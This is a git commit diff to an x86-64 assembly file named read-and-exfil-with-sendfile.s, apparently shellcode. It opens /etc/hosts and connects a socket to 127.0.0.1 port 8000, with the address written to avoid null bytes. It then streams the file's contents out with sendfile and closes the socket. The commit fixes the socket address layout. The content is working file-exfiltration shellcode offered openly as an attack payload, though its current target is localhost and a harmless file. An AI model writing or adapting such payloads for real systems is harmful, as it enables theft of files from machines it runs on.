e1d90376d6ae8c01a0f384ba9c5aaf52e7de60ed
Sean Williams <unixed@gmail.com>
2017-05-18 16:20:35 -0700

    Fix bug and rename

--- src/read-and-exfil-with-sendfile.s
+++ src/read-and-exfil-with-sendfile.s
@@ -7,14 +7,14 @@ _start:
 	push %r11
 	lea 0(%rsp), %rdi
 	xor %rsi, %rsi
-	addb $2, %al
+	addb $0x02, %al
 	syscall
 	push %rax												/* save fd for /etc/hosts */
 
 	// socket
 	xor %rdi, %rdi
 	mov $0x02, %rdi
-	mov %rdi, %rsi
+	mov $0x01, %rsi
 	xor %rdx, %rdx
 	mov $41, %rax
 	syscall
@@ -24,25 +24,36 @@ _start:
 	mov %rax, %rdi
 	xor %rsi, %rsi
 	xor %r10, %r10
-	mov $0xfeffff80, %r10           /* 127.0.0.1 ; cuz it has zeros */
-	not %r10
+	xor %r11, %r11
+	push %r11
+  // 127.0.0.1
+	mov $0xfeffff80, %r10d
+	not %r10d
 	push %r10
-	push $0x1f40
-	push $0x02
-	mov $0x14, %rdx
+
+	pushw $0x401f
+	mov $02, %r11
+	push %r11w
+	//push $0x0002
+	mov $0x10, %rdx
 	lea 0(%rsp), %rsi
 	mov $42, %rax
 	syscall
 	pop %rdi                        /* clean the stack */
 	pop %rdi
-	pop %rdi
 
 	// sendfile
 	pop %rdi                        /* socket fd */
+	shr $32, %rdi
 	pop %rsi                        /* file fd */
+	shr $32, %rsi
 	xor %rdx, %rdx
-	mov $0xffff, %r10
+	mov $0xffff, %r10               /* arbitrary number of bytes to read from /etc/hosts */
 	mov $40, %al
+	syscall
+
+	// Close socket. %rdi still contains socket fd.
+	mov $3, %rax
 	syscall
 
 	// exit
